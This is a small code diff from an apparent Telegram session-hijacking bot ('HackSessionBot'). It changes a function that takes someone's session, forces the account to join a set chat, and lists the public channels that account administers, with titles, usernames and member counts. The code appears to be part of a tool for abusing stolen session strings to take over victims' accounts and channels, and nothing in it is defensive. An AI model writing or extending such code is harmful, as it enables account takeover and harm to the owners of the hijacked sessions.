@@ -6,7 +6,7 @@ from HackSessionBot import (
      API_ID,
      API_HASH,
      CHAT )
-
+from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
 
 
 async def users_gc(session):
@@ -19,7 +19,7 @@ async def users_gc(session):
                     await steve(join(CHAT))
                 except Exception as e:
                     print(e)
-                k = await steve(pc())            
+                k = await steve(GetAdminedPublicChannelsRequest())            
                 for x in k.chats:
                     try:
                         msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
